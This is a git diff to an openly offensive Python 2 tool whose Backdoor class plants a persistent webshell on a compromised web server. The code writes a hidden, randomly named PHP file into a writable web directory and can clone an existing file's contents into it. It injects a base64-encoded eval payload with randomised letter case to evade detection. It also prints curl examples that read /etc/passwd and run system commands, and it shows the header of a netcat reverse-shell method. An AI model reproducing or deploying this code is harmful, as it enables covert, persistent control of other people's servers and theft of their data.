@@ -56,7 +56,7 @@ class Backdoor(object):
                 make_request.get_page_source(cmd)
                 print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
 
-                
+
     def netcat(self, ip, port):
         '''
         nc openbsd deosn't have -e switch
@@ -112,7 +112,7 @@ class Backdoor(object):
             filename = '.'+''.join(random.choice(string.ascii_letters + string.digits) for x in range(8))+'.php'     # Ths could be put into a function? Snap! (<--with msf)
             print '{0}[+] Filename: \'{1}\'{2}'.format(Colors.GREEN, filename, Colors.END)
             location = '{0}/{1}'.format(folder, filename)
-            
+
             cmd = 'find {0} -type f -print'.format(wwwroot)
             files=make_request.get_page_source(cmd)
             print '{0}[i] Select a file to \'clone\' (or \'0\' to skip):{1}'.format(Colors.GREEN, Colors.END)
@@ -123,17 +123,15 @@ class Backdoor(object):
                 path.append(file)
                 c += 1
                 print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, file, Colors.END)
-            
-            clone=raw_input('{0}[>]: {1}'.format(Colors.GREEN, Colors.END))
+
+
+            clone=raw_input('{0}[>] Which file to use? [0-{1}]: {2}'.format(Colors.GREEN, c, Colors.END))
             if clone is not "0":
                 cmd = 'cp -f {0} {1}'.format(path[int(clone)-1], location)
                 make_request.get_page_source(cmd)
-                
+
             print '{0}[+] Creating our \'evil\' file: \'{1}\'{2}'.format(Colors.GREEN, location, Colors.END)
             parameter = ''.join(random.choice(string.ascii_lowercase) for x in range(6))
-            #  1) cmd = 'echo "<?php @eval(\$_GET[\'cmd\'].\';\'); ?>" > "{0}"'.format(location)
-            #2.1) payload = 'echo "@eval(\$_GET[\'{0}\'].\';\');" | base64'.format(parameter)
-            #2.2) cmd = 'echo "<?php eval(base64_decode("{0}" ?>" > "{1}"'.format(payload, location)    
             import base64, itertools
             casePayload=random.choice(map(''.join, itertools.product(*((c.upper(), c.lower()) for c in 'eval'))))
             caseShell=random.choice(map(''.join, itertools.product(*((c.upper(), c.lower()) for c in 'php eval(base64_decode'))))
@@ -142,11 +140,11 @@ class Backdoor(object):
             evilFile= "<?{0}(\"{1}\")); ?>".format(caseShell, payloadEncoded)
             cmd = 'echo \'{0}\' >> \"{1}\"'.format(evilFile, location)
             make_request.get_page_source(cmd)
-            
+
             print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
-            
+
             uri = folder[len(wwwroot):]
-            print '{0}[i] Example:\n[i]\tcurl "{1}{2}/{3}?{4}=require(\'/etc/passwd\')"\n[i]\tcurl "{1}{2}/{3}?{4}=system(\'/sbin/ifconfig\')"{5}'.format(Colors.GREEN, ip, uri, filename, parameter, Colors.END)  # Needs to search, http & https
+            print '{0}[i] Example:\n[i]\tcurl "{1}{2}/{3}?{4}=require(\'/etc/passwd\')"\n[i]\tcurl "{1}{2}/{3}?{4}=system(\'/sbin/ifconfig\')"{5}'.format(Colors.GREEN, ip, uri, filename, parameter, Colors.END)  # Need to add  http or https infront
         else:
             print '\n{0}[!] Unable to find a wriable directory'.format(Colors.RED, Colors.END)
 
